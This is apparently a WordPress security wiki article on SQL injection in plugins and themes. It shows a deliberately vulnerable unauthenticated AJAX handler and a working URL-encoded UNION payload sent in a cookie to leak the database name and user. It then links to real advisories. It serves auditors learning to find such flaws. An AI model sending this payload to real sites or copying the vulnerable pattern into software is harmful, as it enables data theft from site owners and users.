---
title: SQL Injection (SQLi)
contributors:
    - rafiem
---

## Introduction

This article covers cases of possible SQLi on WordPress. This includes improper usage of functions and user input handling inside of the plugin/theme which can be used to inject a malicious query into the SQL execution to leak sensitive data.

## Useful Functions

Several functions could be useful to identify a possible SQLi vulnerability:

- [`$wpdb->query`](https://developer.wordpress.org/reference/classes/wpdb/query/)
- [`$wpdb->get_var`](https://developer.wordpress.org/reference/classes/wpdb/get_var/)
- [`$wpdb->get_row`](https://developer.wordpress.org/reference/classes/wpdb/get_row/)
- [`$wpdb->get_col`](https://developer.wordpress.org/reference/classes/wpdb/get_col/)
- [`$wpdb->get_results`](https://developer.wordpress.org/reference/classes/wpdb/get_results/)

## Example Cases

Below is an example of vulnerable code:

```php
add_action("wp_ajax_nopriv_load_questions", "load_questions");

function load_questions(){
    global $wpdb;

    $quiz_id = $_GET["quiz_id"];

    if ( isset($_COOKIE[ 'question_ids_'.$quiz_id ]) ) {
        $question_sql = sanitize_text_field( wp_unslash( $_COOKIE[ 'question_ids_'.$quiz_id ] ) );
    }else {
        $question_ids = array("1","2","3");
        $question_sql = implode( ',', $question_ids );
    }
    
    $order_by_sql = 'ORDER BY FIELD(question_id,'.$question_sql.')';

    $query     = $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}custom_questions WHERE question_id IN (%1s)", $question_sql);
    $questions = $wpdb->get_results( stripslashes( $query ) );

    wp_send_json($questions);
}
```

The vulnerable variable, in this case, is the `$question_sql` variable where the value is passed from `$_COOKIE[ 'question_ids_'.$quiz_id ]` value without proper sanitization or escaping. The `sanitize_text_field` function is not enough to prevent SQL Injection since the `$question_sql` variable is constructed inside an ORDER BY clause without proper escaping.

To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed action and parameter to trigger the SQL Injection (let's say that the `{$wpdb->prefix}custom_questions` table has 5 columns):

```http
GET /wp-admin/admin-ajax.php?action=load_questions&quiz_id=1 HTTP/1.1
Host: localhost
Cookie: question_ids_1=1%29%20and%20false%20union%20select%20database%28%29%2C%271337%27%2C%271337%27%2Cuser%28%29%2C%271337%27%20--%20-%20
Connection: close

```

Below are some of the findings related to SQLi:

- [Critical Vulnerabilities Patched in REHub Theme and Plugin](https://patchstack.com/articles/critical-vulnerabilities-patched-in-rehub-theme-and-plugin/)
- [Critical SQL Injection Found in Porto Theme's Plugin](https://patchstack.com/articles/critical-sql-injection-found-in-porto-themes-plugin/)
- [Multiple High and Critical Vulnerabilities in Avada Theme and Plugin](https://patchstack.com/articles/multiple-high-and-critical-vulnerabilities-in-avada-theme-and-plugin/)
- [Critical Unauthenticated SQL Injection in Quiz And Survey Master <= 8.1.4](https://patchstack.com/articles/critical-unauthenticated-sql-injection-in-quiz-and-survey-master/)
- [Multiple Vulnerabilities Fixed In WP Statistics Plugin Version <= 13.2.10](https://patchstack.com/articles/multiple-authenticated-sql-injection-fixed-in-wp-statistics-plugin-version-13-2-10/)
- [Multiple Critical Vulnerabilities Fixed In LearnPress Plugin Version <= 4.1.7.3.2](https://patchstack.com/articles/multiple-critical-vulnerabilities-fixed-in-learnpress-plugin-version/)